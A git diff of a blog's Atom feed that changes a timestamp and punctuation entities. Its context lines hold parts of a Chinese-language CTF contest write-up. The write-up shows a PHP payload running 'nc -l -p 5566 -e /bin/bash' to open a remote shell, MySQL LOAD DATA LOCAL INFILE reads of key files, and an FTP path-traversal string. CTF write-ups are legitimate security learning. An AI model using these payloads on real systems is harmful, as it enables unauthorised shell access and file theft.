@@ -4,7 +4,7 @@
   <title><![CDATA[Category: note | blog.dm4.tw]]></title>
   <link href="http://blog.dm4.tw/blog/categories/note/atom.xml" rel="self"/>
   <link href="http://blog.dm4.tw/"/>
-  <updated>2013-01-28T01:32:21+08:00</updated>
+  <updated>2013-11-08T03:35:00+08:00</updated>
   <id>http://blog.dm4.tw/</id>
   <author>
     <name><![CDATA[dm4]]></name>
@@ -40,7 +40,7 @@ Change the value of the parameter NtfsDisable8dot3NameCreation to a value of 1 (
 and then short filename generation will be disabled.</p></blockquote>
 
 <p>所以就想到去試一下 <a href="http://wg2.hack.idv.tw:2012/HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/FileSystem/NtfsDisable8dot3NameCreation/key.txt">http://wg2.hack.idv.tw:2012/HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/FileSystem/NtfsDisable8dot3NameCreation/key.txt</a>
-沒想到就...... orz</p>
+沒想到就&hellip;&hellip; orz</p>
 ]]></content>
   </entry>
   
@@ -102,7 +102,7 @@ LOAD DATA LOCAL INFILE '/home/ow200/public_html/key.php' INTO TABLE web2;
 ?&gt;
 </code></pre>
 
-<p>本來以為這題這樣就結束了，不過我們想到既然可以用 <code>cat</code> ，搞不好這題可以......</p>
+<p>本來以為這題這樣就結束了，不過我們想到既然可以用 <code>cat</code> ，搞不好這題可以&hellip;&hellip;</p>
 
 <pre><code>&lt;?php
     system('nc -l -p 5566 -e /bin/bash');
@@ -110,7 +110,7 @@ LOAD DATA LOCAL INFILE '/home/ow200/public_html/key.php' INTO TABLE web2;
 ?&gt;
 </code></pre>
 
-<p>然後......</p>
+<p>然後&hellip;&hellip;</p>
 
 <pre><code>[~] $ nc wg.hack.idv.tw 5566
 id
@@ -130,7 +130,7 @@ LOAD DATA LOCAL INFILE '/home/my100/key.txt' INTO TABLE web3;
 
 <h3>Web 6</h3>
 
-<p>也是用爛招...... 用 Web 4 拿到的 shell 去看 Web 6 的 source ，在 <code>/home/a200/public_html/index.php</code>
+<p>也是用爛招&hellip;&hellip; 用 Web 4 拿到的 shell 去看 Web 6 的 source ，在 <code>/home/a200/public_html/index.php</code>
 裡面會判斷如果用 <code>admin</code> 登入的話，會噴 base64 encode 之後的 key</p>
 
 <h3>Potent Pwnables 2</h3>
@@ -160,7 +160,7 @@ local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
 </code></pre>
 
 <p>剩下的時間都在試著解 Web 5 ，以及一直看 <a href="http://www.youtube.com/watch?v=l2dvg3KJoPo">駭客觀察日記</a>
-不過看到結束還是沒找到應該怎麼解......</p>
+不過看到結束還是沒找到應該怎麼解&hellip;&hellip;</p>
 
 <p>再次感謝辛苦的主辦單位和工作人員！還有又強又好心收留我帶我一起玩的 crax 隊友！</p>
 
